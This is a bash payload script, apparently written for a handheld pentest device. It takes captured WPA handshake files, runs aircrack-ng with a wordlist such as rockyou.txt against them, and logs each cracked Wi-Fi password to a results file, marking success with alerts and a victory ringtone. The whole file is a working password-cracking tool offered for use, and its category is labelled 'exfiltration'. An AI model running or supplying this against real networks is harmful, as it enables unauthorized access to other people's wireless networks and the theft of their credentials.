#!/bin/bash
# Title: Interactive Handshake Cracker
# Author: sinX
# Description: Interactive WPA handshake cracker with wordlist selection and progress tracking
# Version: 1.0
# Category: user/exfiltration

# ============================================
# CONFIGURATION
# ============================================
# Default wordlist paths (edit to match your setup)
WORDLIST_DIR="/root/wordlists"
DEFAULT_WORDLIST="$WORDLIST_DIR/rockyou.txt"
HANDSHAKE_DIR="/root/loot/handshakes"
RESULTS_FILE="/root/cracked_passwords.txt"

# ============================================
# FUNCTIONS
# ============================================

function select_handshake() {
    # Find all handshake files
    local files=($(find "$HANDSHAKE_DIR" -name "*.pcap" -o -name "*.cap" 2>/dev/null))

    if [ ${#files[@]} -eq 0 ]; then
        ERROR_DIALOG "No handshake files found in $HANDSHAKE_DIR"
        return 1
    fi

    # Show file selection (simplified - using first file for now)
    # In a real implementation, you'd use multiple TEXT_PICKER calls or custom UI
    SELECTED_FILE="${files[0]}"

    # Extract ESSID
    ESSID=$(aircrack-ng "$SELECTED_FILE" 2>/dev/null | grep -oP "(?<=\().*(?=\))" | head -1)
    if [ -z "$ESSID" ]; then
        ESSID="Unknown Network"
    fi

    LOG blue "Selected: $ESSID"
    LOG blue "File: $SELECTED_FILE"

    return 0
}

function select_wordlist() {
    # List available wordlists
    local wordlists=($(find "$WORDLIST_DIR" -name "*.txt" -o -name "*.lst" 2>/dev/null))

    if [ ${#wordlists[@]} -eq 0 ]; then
        ERROR_DIALOG "No wordlists found in $WORDLIST_DIR"
        return 1
    fi

    # For simplicity, use default wordlist
    # In real implementation, allow user selection
    SELECTED_WORDLIST="$DEFAULT_WORDLIST"

    if [ ! -f "$SELECTED_WORDLIST" ]; then
        ERROR_DIALOG "Wordlist not found: $SELECTED_WORDLIST"
        return 1
    fi

    # Get wordlist size
    WORDLIST_SIZE=$(wc -l < "$SELECTED_WORDLIST" 2>/dev/null || echo "Unknown")

    LOG green "Wordlist: $(basename $SELECTED_WORDLIST)"
    LOG green "Entries: $WORDLIST_SIZE"

    return 0
}

function crack_handshake() {
    local handshake_file="$1"
    local wordlist="$2"
    local bssid="$3"

    LOG yellow "Starting crack..."
    SPINNER "Cracking in progress..."

    # Run aircrack-ng
    aircrack-ng -w "$wordlist" -b "$bssid" "$handshake_file" > /tmp/crack_result.txt 2>&1
    local result=$?

    # Parse output
    PASSWORD=$(grep -oP "KEY FOUND! \[ \K[^\]]*" /tmp/crack_result.txt)

    if [ -n "$PASSWORD" ]; then
        return 0
    else
        return 1
    fi
}

# ============================================
# MAIN EXECUTION
# ============================================

LOG green "=== Interactive Handshake Cracker ==="

# Welcome message
resp=$(CONFIRMATION_DIALOG "Crack captured handshakes?")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
        LOG "User cancelled"
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    exit 0
fi

# Check for required tools
if ! command -v aircrack-ng &> /dev/null; then
    ERROR_DIALOG "aircrack-ng not installed"
    LOG red "Install with: opkg update && opkg install aircrack-ng"
    exit 1
fi

# Step 1: Select handshake file
LOG "Step 1: Selecting handshake file..."

# Create handshake directory if it doesn't exist
mkdir -p "$HANDSHAKE_DIR"

# Count handshakes
HANDSHAKE_COUNT=$(find "$HANDSHAKE_DIR" -name "*.pcap" -o -name "*.cap" 2>/dev/null | wc -l)

if [ "$HANDSHAKE_COUNT" -eq 0 ]; then
    ERROR_DIALOG "No handshakes found!\nCapture handshakes first."
    exit 1
fi

LOG green "Found $HANDSHAKE_COUNT handshake file(s)"

# For this example, we'll process the most recent handshake
SELECTED_FILE=$(find "$HANDSHAKE_DIR" -name "*.pcap" -o -name "*.cap" 2>/dev/null | head -1)

if [ -z "$SELECTED_FILE" ]; then
    ERROR_DIALOG "Failed to select handshake"
    exit 1
fi

# Extract network info
ESSID=$(aircrack-ng "$SELECTED_FILE" 2>/dev/null | grep -oP "(?<=\().*(?=\))" | head -1)
BSSID=$(aircrack-ng "$SELECTED_FILE" 2>/dev/null | grep -oP "[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}" | head -1)

if [ -z "$ESSID" ]; then
    ESSID="Unknown"
fi

if [ -z "$BSSID" ]; then
    ERROR_DIALOG "Could not extract BSSID from handshake"
    exit 1
fi

LOG blue "Target: $ESSID"
LOG blue "BSSID: $BSSID"

# Step 2: Select wordlist
LOG "Step 2: Selecting wordlist..."

mkdir -p "$WORDLIST_DIR"

if [ ! -f "$DEFAULT_WORDLIST" ]; then
    ERROR_DIALOG "Wordlist not found: $DEFAULT_WORDLIST\nPlace wordlists in $WORDLIST_DIR"
    exit 1
fi

WORDLIST_SIZE=$(wc -l < "$DEFAULT_WORDLIST" 2>/dev/null || echo "0")
LOG green "Using: $(basename $DEFAULT_WORDLIST)"
LOG green "Passwords to test: $WORDLIST_SIZE"

# Step 3: Confirm crack
resp=$(CONFIRMATION_DIALOG "Crack $ESSID with $(basename $DEFAULT_WORDLIST)?")
case $? in
    $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED)
        LOG "Cancelled by user"
        exit 0
        ;;
esac

if [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    exit 0
fi

# Step 4: Crack!
LOG yellow "=== CRACKING STARTED ==="
LOG yellow "This may take a while..."

# Show spinner and start crack
aircrack-ng -w "$DEFAULT_WORDLIST" -b "$BSSID" "$SELECTED_FILE" > /tmp/crack_output.txt 2>&1 &
CRACK_PID=$!

# Wait for crack to complete with status updates
while kill -0 $CRACK_PID 2>/dev/null; do
    sleep 2
    SPINNER "Cracking $ESSID..."
done

# Get result
wait $CRACK_PID
CRACK_RESULT=$?

# Parse output
PASSWORD=$(grep -oP "KEY FOUND! \[ \K[^\]]*" /tmp/crack_output.txt)

if [ -n "$PASSWORD" ]; then
    # SUCCESS!
    LOG green "=========================================="
    LOG green "PASSWORD FOUND!"
    LOG green "=========================================="
    LOG green "Network: $ESSID"
    LOG green "BSSID: $BSSID"
    LOG green "Password: $PASSWORD"
    LOG green "=========================================="

    # Save to results file
    echo "$(date '+%Y-%m-%d %H:%M:%S') | $ESSID | $BSSID | $PASSWORD" >> "$RESULTS_FILE"

    # Alert user
    ALERT "PASSWORD CRACKED!\n\nNetwork: $ESSID\nPassword: $PASSWORD"

    # Celebrate
    VIBRATE
    sleep 0.3
    VIBRATE
    sleep 0.3
    VIBRATE

    RINGTONE "victory:d=4,o=5,b=120:16e6,16e6,16e6,8c6,16e6,8g6,8g"

else
    # FAILED
    LOG red "=========================================="
    LOG red "PASSWORD NOT FOUND"
    LOG red "=========================================="
    LOG red "The password was not in the wordlist"
    LOG yellow "Try a different/larger wordlist"

    ERROR_DIALOG "Password not found in wordlist"
fi

# Cleanup
rm -f /tmp/crack_output.txt

# Show results file location
if [ -f "$RESULTS_FILE" ]; then
    CRACKED_COUNT=$(wc -l < "$RESULTS_FILE")
    LOG blue "Total cracked networks: $CRACKED_COUNT"
    LOG blue "Results saved to: $RESULTS_FILE"
fi

LOG "Crack session complete!"
exit 0
